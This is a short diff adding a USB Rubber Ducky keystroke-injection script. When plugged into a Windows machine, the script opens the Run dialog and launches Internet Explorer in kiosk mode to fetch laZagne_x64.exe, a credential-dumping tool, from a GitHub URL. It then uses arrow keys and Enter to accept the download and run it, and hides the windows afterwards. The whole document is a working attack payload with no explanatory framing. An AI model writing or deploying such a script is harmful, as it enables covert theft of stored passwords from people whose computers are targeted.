@@ -1,0 +1,38 @@
+DELAY 2000
+
+
+GUI r
+
+
+DELAY 800
+
+
+STRING iexplore -k https://github.com/psychovill/laZagne/raw/master/Windows/lazagne/laZagne_x64.exe
+
+
+ENTER
+
+
+DELAY 5000
+
+
+RIGHTARROW
+
+
+DELAY 400
+
+
+RIGHTARROW
+
+
+DELAY 400
+
+
+ENTER
+
+
+DELAY 400
+
+
+GUI d
+
